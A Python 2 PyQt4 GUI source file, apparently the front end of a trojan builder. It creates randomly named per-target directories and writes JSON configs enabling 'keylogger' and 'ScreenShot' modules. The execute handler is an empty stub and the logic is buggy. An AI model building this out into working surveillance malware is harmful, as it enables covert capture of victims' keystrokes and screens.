import sys
from PyQt4.QtCore import *
from PyQt4.QtGui import *
from PyQt4 import uic
import json
import base64
import random, string
import os

form_class = uic.loadUiType("trojan.ui")[0]



class TrojanWindow(QMainWindow, form_class):
    def __init__(self):
        super(QMainWindow,self).__init__()
        super(form_class, self).__init__()
        self.setupUi(self)
        self.connect(self.MakeTrojan_Button, SIGNAL("clicked()"), self.MakeTrojan_Clicked)
        self.connect(self.ExecuteTrojan_Button, SIGNAL("clicked()"), self.ExecuteTrojan_Clicked)
        self.TargetNum_Button.setPlainText("0")
        self.clicked = 2
        self.noneclicked = 0
        self.Keylogger_Check = None
        self.ScreenShot_Check = None
        self.targetNum_Button = None
        self.config = {"module": ""}
        self.configAll = [{"module": "None"} for _ in range(10)]
        self.jsonDumped = None

    def MakeTrojan_Clicked(self):
        self.Keylogger_Check = self.Keylogger_CheckBox.checkState()
        self.ScreenShot_Check = self.ScreenShot_CheckBox.checkState()
        self.targetNum_Button = self.TargetNum_Button.toPlainText()
        print self.targetNum_Button
        if int(self.targetNum_Button) is not None or 0:
            self.MakeRandomDirectory(int(self.targetNum_Button))


    def MakeRandomDirectory(self, number):
        for i in range(number):
            dirName = self.randomword(10)
            if not os.path.exists(dirName):
                os.makedirs(dirName)
                os.makedirs(dirName + "/config")
                os.makedirs(dirName + "/data")
                os.makedirs(dirName + "/modules")
            if int(self.Keylogger_Check) is self.clicked:
                self.jsonDumped = self.MakeConfig("keylogger", 0)
            if int(self.ScreenShot_Check) is self.clicked:
                self.jsonDumped = self.MakeConfig("ScreenShot", 1)
            if self.jsonDumped is not None:
                f = open(dirName+"/config/"+dirName+".json", 'wb').write(self.jsonDumped)


    def MakeConfig(self, name, number):
        self.config["module"] = name
        self.configAll[number] = self.config
        dumped = json.dumps(self.configAll)
        return dumped

    def ExecuteTrojan_Clicked(self):
        print 1



        print 2

    def randomword(self, length):
        return ''.join(random.choice(string.lowercase) for i in range(length))

if __name__ == "__main__":
    trojan = QApplication(sys.argv)
    trojanWindow = TrojanWindow()
    trojanWindow.show()
    trojan.exec_()
